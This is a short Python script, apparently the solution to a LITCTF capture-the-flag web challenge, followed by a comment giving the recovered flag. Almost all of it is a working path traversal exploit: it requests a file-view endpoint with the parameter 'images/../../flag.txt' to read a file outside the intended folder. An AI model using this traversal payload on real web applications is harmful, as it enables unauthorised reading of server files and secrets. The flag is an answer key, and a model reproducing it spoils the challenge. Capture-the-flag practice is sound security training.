import requests

url = "http://litctf.org:31776/view-file?file=images/../../flag.txt"
r = requests.get(url)
print(r.text)

# Flag: LITCTF{d4ng_i_gu3ss_th4t_w4snt_s3cure_enough}